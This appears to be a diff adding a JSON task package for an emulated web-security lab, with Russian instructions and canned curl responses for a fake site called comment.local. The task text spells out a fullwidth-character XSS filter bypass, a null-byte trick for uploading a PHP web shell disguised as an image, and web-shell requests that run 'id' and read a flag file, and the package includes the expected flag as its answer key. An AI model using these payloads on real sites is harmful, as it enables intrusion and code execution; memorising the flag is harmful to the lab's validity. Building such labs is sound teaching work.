@@ -1,0 +1,25 @@
+{
+  "id": "web-unicode-normalization",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{un1c0d3_null_byt3_byp4ss}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: Unicode и null byte\n\n`comment.local` фильтрует тег `<script>`, а загрузка файлов проверяет\nрасширение. Оба фильтра обходятся расхождением слоёв.\n\n1. Обойди фильтр тега полноширинными символами (NFKC свернёт их обратно):\n\n   curl -s -X POST https://comment.local/post --data-urlencode 'text=＜script＞alert(1)＜/script＞'\n\n2. Null byte обрывает строку: фильтр видит `.png`, а ФС сохраняет `.php`.\n   Загрузи веб-шелл под маской картинки:\n\n   curl -s -X POST https://comment.local/upload -F 'file=@shell.png%00.php'\n\n3. Выполни команду и прочитай флаг:\n\n   curl -s 'https://comment.local/uploads/shell.php?c=id'\n   curl -s 'https://comment.local/uploads/shell.php?c=cat /flag.txt' | grep nto > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция comment.local)",
+      "cases": [
+        { "match": "shell\\.php.*flag|flag\\.txt.*shell\\.php", "example": "-s 'https://comment.local/uploads/shell.php?c=cat /flag.txt'", "output": "nto{un1c0d3_null_byt3_byp4ss}\n" },
+        { "match": "uploads/shell\\.php", "example": "-s 'https://comment.local/uploads/shell.php?c=id'", "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n" },
+        { "match": "%00", "example": "-s -X POST https://comment.local/upload -F 'file=@shell.png%00.php'", "output": "{\"saved\":\"shell.php\"}\n" },
+        { "match": "＜script＞", "example": "-s -X POST https://comment.local/post --data-urlencode 'text=＜script＞alert(1)＜/script＞'", "output": "{\"ok\":true,\"stored\":\"<script>alert(1)</script>\"}\n" },
+        { "match": "<script", "example": "-s -X POST https://comment.local/post -d 'text=<script>alert(1)</script>'", "output": "{\"error\":\"forbidden tag\"}\n" },
+        { "match": "user=аdmin", "example": "-s 'https://comment.local/api/check?user=аdmin'", "output": "{\"exists\":false}\n" },
+        { "match": "user=admin", "example": "-s 'https://comment.local/api/check?user=admin'", "output": "{\"exists\":true}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только comment.local (post/upload/check).\n"
+    }
+  }
+}
